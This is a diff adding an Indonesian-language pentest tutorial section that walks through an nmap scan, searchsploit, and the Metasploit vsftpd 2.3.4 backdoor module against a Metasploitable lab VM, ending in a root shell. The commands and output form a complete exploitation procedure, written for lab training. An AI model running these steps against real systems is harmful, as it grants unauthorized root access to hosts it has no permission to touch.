@@ -1067,3 +1067,287 @@ Shellcodes: No Results
 ```
 
 Kita juga dapat mencari exploit melalui pihak ketiga melalui internet, ketik di google `vsftpd 2.3.4 exploit` nanti akan diarahkan ke website exploit.
+
+### Vurnerability Analysis dengan Nessus
+
+Nessus adalah tools vurnerability analysis yang memiliki beberapa versi berbayar maupun yang gratis. Download Nessus versi essensial disini [https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials) untuk yang versi gratis.
+
+Berikut tampilan nessus dengan hasil scanning vurnerability analysis dari metasploitable dengan ip 192.168.1.22.
+
+![Nessus scanning](img/nessus1.png)
+
+![Nessus scanning](img/nessus2.png)
+
+## 5. Exploitation
+
+Tool exploitation yang digunakan pada tutorial ini kita akan menggunakan framework metasploit. Lokasi direktori metasploit berada di `/usr/share/metasploit-framework`.
+Untuk module metasploit berada di direktori `modules`
+
+### Exploit vsftpd
+
+Scan target:
+
+```bash
+$ nmap -sS -sV 192.168.1.22
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 22:42 +08
+Nmap scan report for 192.168.1.22 (192.168.1.22)
+Host is up (0.0015s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:B4:9C (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
+```
+
+Dari hasil scan ditemukan port 21 terbuka untuk service ftp `vsftpd 2.3.4`. Kita cari exploitnya:
+
+```bash
+$ searchsploit vsftpd 2.3.4         
+
+----------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                         |  Path
+----------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                              | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                 | unix/remote/17491.rb
+----------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Dari hasil di atas ditemukan 2 exploit yaitu `unix/remote/49757.py` dan `unix/remote/17491.rb` yang berasal dari Metasploit. Masuk kedalam `msconsole`
+
+```bash
+$ sudo msfconsole 
+
+[sudo] password for ucup: 
+
+Metasploit tip: Start commands with a space to avoid saving them to history
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2466 exploits - 1273 auxiliary - 393 post       ]
++ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > 
+```
+
+Mencari exploit vsftpd 2.3.4
+
+```bash
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+Menggunakan exploit bisa dengan perintah `use exploit/unix/ftp/vsftpd_234_backdoor` atau `use 0`.
+
+
+```bash
+msf6 > use 0
+
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+
+Melihat informasi ketik `show info`:
+
+```bash
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show info
+
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm <x@hdm.io>
+  MC <mc@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the       VSFTPD download
+  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
+  June 30th 2011 and July 1st 2011 according to the most recent information
+  available. This backdoor was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+
+Dari data yang muncul ip address host target pada bagian `RHOSTS` masih kosong. Kita masukan data ip address target dengan perintah `set RHOSTS xxx.xxx.xxx.xxx`
+
+```bash
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+```
+
+cek options untuk melihat konfigurasi jalankan `show options`
+
+```bash
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Untuk mulai exploit jalankan perintah `exploit` atau `run`.
+
+```bash
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.1.22:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.1.22:21 - USER: 331 Please specify the password.
+[+] 192.168.1.22:21 - Backdoor service has been spawned, handling...
+[+] 192.168.1.22:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.1.21:46569 -> 192.168.1.22:6200) at 2024-12-14 23:05:14 +0800
+```
+
+Bannggg!!!! kita sudah berada dalam shell target untuk mengujinya ketik `ifconfig` untuk mengetahui ip addressnya.
+
+```bash
+ifconfig
+
+eth0      Link encap:Ethernet  HWaddr 08:00:27:27:b4:9c  
+          inet addr:192.168.1.22  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe27:b49c/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2557 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2400 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:174391 (170.3 KB)  TX bytes:188935 (184.5 KB)
+          Base address:0xd020 Memory:f0200000-f0220000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:244 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:244 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:93713 (91.5 KB)  TX bytes:93713 (91.5 KB)
+```
+
+Kita sudah berada dalam shell target. 
+Untuk keluar ketik `exit`.
